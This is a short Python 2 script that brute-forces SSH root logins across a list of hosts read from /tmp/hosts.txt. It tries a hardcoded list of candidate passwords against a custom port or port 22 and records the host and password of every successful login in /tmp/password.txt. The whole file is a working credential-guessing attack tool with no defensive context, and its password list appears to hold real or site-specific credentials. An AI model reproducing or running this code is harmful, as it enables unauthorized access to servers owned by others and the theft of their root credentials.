#!/usr/local/bin/python
import socket
from pexpect import pxssh

def trypassword(host,username,pwd,port):
    try:                                                                            
        s=pxssh.pxssh()                                                             
        s.login(host,username,pwd,port=port)                                        
        target.write("host: %s is login success,password is %s" %(host,pwd))
        print "host: %s is login success,password is %s" %(host,pwd)
    except:                                                                         
        print "host: %s login has no pass" %(host)                          
                                                                                
        

def getpassword(host,username,pwd_dict,port):
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk.settimeout(1)
    result=sk.connect_ex((host,14816))
    print result
    if not result:
        for pwd in pwd_dict:
            trypassword(host,username,pwd,port)
    elif (result == 11):
        noconnect.write("host:%s is not connect" % (host))
        print  "host:%s is not connect" % (host)
    else:
        for pwd in pwd_dict:
            trypassword(host,username,pwd,port=22)     
                

     
if __name__ == '__main__':
    pwd_dict=['leoxu8703@123','oracle2046@123','0','jingxing99@123','1qaz2wsx@123','12345.com','12345@123','ranger@123']
    username='root'
    port=14816
    with open('/tmp/hosts.txt') as hosts,open('/tmp/password.txt','a') as target,open('/tmp/notconnect.txt','a') as noconnect:
        for host in hosts:
            host=host.strip('\n\r')
            print "begin to get password from host:%s" %(host)
            getpassword(host,username,pwd_dict,port)
